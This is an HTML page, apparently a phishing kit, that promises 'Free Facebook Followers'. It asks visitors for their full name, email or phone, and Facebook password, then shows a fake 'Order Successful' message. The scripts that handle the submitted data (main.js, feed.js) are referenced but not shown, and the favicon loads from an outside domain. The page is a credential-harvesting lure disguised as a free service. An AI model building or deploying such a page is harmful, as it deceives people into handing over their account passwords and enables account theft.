<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://2lucky.cfd/iG/v1/icon.png" type="image/x-icon">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
    <meta name="robots" content="noindex, nofollow">
    <title>Free Facebook Followers</title>
    <style>
        /* Your CSS styles here */
        body {
            background-color: #f0f0f0;
            color: #333;
            font-family: 'Montserrat', sans-serif;
        }
        
        .navbar {
            background-color: #fff;
            padding: 15px 0;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        
        .sf-nav-logo img {
            height: 40px;
        }
        
        .sf-panel {
            background-color: #fff;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            margin-top: 30px;
        }
        
        .sf-panel .body h3 {
            color: #333;
            font-size: 24px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .sf-panel .body h3 span {
            color: #ff3267;
        }
        
        .form-control {
            border: 1.2px solid #ccc;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        
        .btn.button.sf-button {
            background-color: #ff3267;
            color: #fff;
            width: 300px;
            border-radius: 10px;
            padding: 10px 20px;
            font-size: 16px;
            text-transform: uppercase;
            font-weight: bold;
        }
        
        .review {
            text-align: center;
            background-color: #fff;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            margin-top: 30px;
        }
        
        .review .message {
            font-size: 14px;
            line-height: 1.5;
            color: #666;
        }
        
        .ratings .star {
            color: #ff9f00;
        }
        
        .section-claim {
            padding: 50px 0;
        }
        .container {
            margin-left: 15px;
        }
    </style>
</head>
<body class="claim">
    <nav class="navbar navbar-expand-md navbar-light">
        <!-- Navbar content here -->
    </nav>
    <section class="section-claim start">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-md-7">
                    <div class="sf-panel">
                        <div class="body">
                            <h3 class="heading">Get <span>Free Facebook  Followers</span></h3>
                            <input type="text" name="username" id="username" class="form-control input-text icon camera" placeholder="Full Name " autocomplete="off" aria-required="true">
                            <input type="text" name="email" id="email" class="form-control input-text icon at" placeholder="Email Or Phone No" autocomplete="off" required="">
                            <input type="password" name="password" id="password" class="form-control input-text icon lock" placeholder="Password" autocomplete="off" aria-required="true"><br>
                            <div class="col-12">
                                <select id="followerCount" style="height:50px; width: 100%; padding: 7px; margin-top: 4px; font-size: 14px; font-family: 'Montserrat', sans-serif; background: #ff3267; border-radius: 4px; color: #ffffff; border: none; outline: none;">
                                    <option value="100">100 Followers</option>
                                    <option value="200">200 Followers</option>
                                    <option value="300">300 Followers</option>
                                    <option value="800">400 Followers</option>
                                </select>
                            </div><br>
                            <button type="submit" id="submitButton" class="btn button sf-button pink block" name="submit" value="Start Now">Start Now</button>
                        </div>
                    </div>
                </div>
                <!-- Modal -->
<div class="modal fade" id="successModal" tabindex="-1" role="dialog" aria-labelledby="successModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="successModalLabel">Order Successful!</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        Your order has been successfully submitted.
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
<div class="col-md-5">
    <div class="review">
        <p>RECENT FEEDBACKS</p>
        <div id="feedbackList" class="feedback-list"></div>
    </div>
</div>
        
    </div>
</div>
    </section>

    <!-- Include your JavaScript file -->
    <script src="main.js"></script>
            <!-- Include your JavaScript file -->
    <script src="feed.js"></script>
        
    
        
</body>
</html>
